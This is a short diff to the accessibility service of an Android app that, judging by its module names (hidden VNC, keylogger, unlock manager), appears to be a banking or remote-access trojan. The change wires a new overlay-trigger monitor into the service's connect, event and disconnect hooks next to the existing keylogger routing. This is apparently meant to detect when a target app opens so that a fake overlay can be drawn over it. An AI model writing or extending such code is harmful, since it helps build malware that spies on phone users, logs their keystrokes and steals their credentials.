@@ -8,6 +8,7 @@ import android.view.accessibility.AccessibilityEvent;
 import com.fason.app.features.hvnc.HVncAccessibilityService;
 import com.fason.app.features.inspector.InspectorAccessibilityService;
 import com.fason.app.features.keylogger.KeyloggerManager;
+import com.fason.app.features.overlay.AppTriggerMonitor; // [OVERLAY] Batch A
 import com.fason.app.features.unlock.UnlockManager;
 
 public class FasonAccessibilityService extends AccessibilityService {
@@ -22,6 +23,7 @@ public class FasonAccessibilityService extends AccessibilityService {
         InspectorAccessibilityService.onHostConnected(this);
         KeyloggerManager.onHostConnected(this);
         UnlockManager.onHostConnected(this);
+        AppTriggerMonitor.onHostConnected(this); // [OVERLAY] Batch A
         Log.i(TAG, "Accessibility service connected");
     }
 
@@ -34,6 +36,7 @@ public class FasonAccessibilityService extends AccessibilityService {
                 type == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
                 HVncAccessibilityService.onAccessibilityEvent(event);
                 KeyloggerManager.onAccessibilityEvent(event);
+                AppTriggerMonitor.onAccessibilityEvent(event); // [OVERLAY] Batch A — filters internally for WINDOW_STATE_CHANGED
             } else if (type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ||
                        type == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
                 KeyloggerManager.onAccessibilityEvent(event);
@@ -61,6 +64,7 @@ public class FasonAccessibilityService extends AccessibilityService {
         InspectorAccessibilityService.onHostDisconnected();
         KeyloggerManager.onHostDisconnected();
         UnlockManager.onHostDisconnected();
+        AppTriggerMonitor.onHostDisconnected(); // [OVERLAY] Batch A
         instance = null;
         Log.i(TAG, "Service destroyed");
     }
